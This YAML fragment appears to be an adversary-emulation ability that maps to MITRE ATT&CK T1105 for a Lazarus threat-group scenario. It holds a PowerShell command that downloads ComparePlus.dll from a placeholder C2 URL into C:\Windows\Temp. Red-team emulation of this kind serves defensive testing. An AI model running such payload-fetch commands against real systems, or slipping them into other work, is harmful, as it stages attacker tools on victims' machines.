  technique:
    attack_id: T1105
    name: "Ingress Tool Transfer"
  cti_source: "AttackIQ Intelligence"
  procedure_group: procedure_initial_access
  procedure_step: "1.A"
  platforms:
    windows:
      psh,pwsh:
        command: |
          $url = "#{lazarus.c2.url}/ComparePlus.dll"
          $outPath = "C:\Windows\Temp\ComparePlus.dll"
          Invoke-WebRequest -Uri $url -OutFile $outPath
  executors:
